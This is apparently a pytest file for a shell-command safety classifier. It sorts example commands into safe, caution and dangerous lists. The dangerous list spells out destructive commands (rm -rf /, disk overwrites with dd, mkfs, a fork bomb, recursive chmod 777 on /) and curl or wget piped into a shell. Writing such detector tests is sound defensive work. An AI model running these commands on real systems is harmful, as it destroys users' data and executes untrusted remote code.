import pytest

from shellsafe.safety import Risk, assess

SAFE = [
    "ls -la",
    "find . -name '*.py' -mtime -7",
    "grep -rn TODO src/ 2>/dev/null",
    "ps aux | grep python | head -n 5",
    "du -sh * | sort -h",
    "tar czf backup.tar.gz notes/",
    "echo hello >> log.txt",
    "cat /etc/shells",
    "git status",
    "docker ps -a",
    'grep -r "foo" /system | tee >(wc -l)',
]

CAUTION = [
    "rm notes.txt",
    "rm -rf build/",
    "find /tmp -name '*.log' -mtime +7 -delete",
    "find . -type f -name '*.bak' -exec rm {} \\;",
    "sed -i 's/foo/bar/g' config.ini",
    "git push --force origin main",
    "git reset --hard HEAD~1",
    "echo hi > out.txt",
    "chmod -R 755 site/",
    "sudo apt update",
    "killall firefox",
    "dd if=disk.img of=copy.img bs=4M",
    "docker system prune -a",
]

DANGEROUS = [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /*",
    "rm -fr $HOME",
    "sudo rm -rf /var/log",
    "rm -rf --no-preserve-root /",
    "dd if=/dev/zero of=/dev/sda bs=1M",
    "mkfs.ext4 /dev/sdb1",
    "curl -fsSL https://example.com/install.sh | sh",
    "wget -qO- http://x.sh | sudo bash",
    ":(){ :|:& };:",
    "chmod -R 777 /",
    "sudo chown -R nobody /etc",
    "echo 0 > /dev/sda",
    "crontab -r",
    "mv important.db /dev/null",
    "kill -9 -1",
    "find / -name '*.conf' | xargs sudo rm -f",
]


@pytest.mark.parametrize("cmd", SAFE)
def test_safe(cmd):
    v = assess(cmd)
    assert v.risk == Risk.SAFE, v.reasons


@pytest.mark.parametrize("cmd", CAUTION)
def test_caution(cmd):
    v = assess(cmd)
    assert v.risk == Risk.CAUTION, v.reasons
    assert v.reasons


@pytest.mark.parametrize("cmd", DANGEROUS)
def test_dangerous(cmd):
    v = assess(cmd)
    assert v.risk == Risk.DANGEROUS, v.reasons
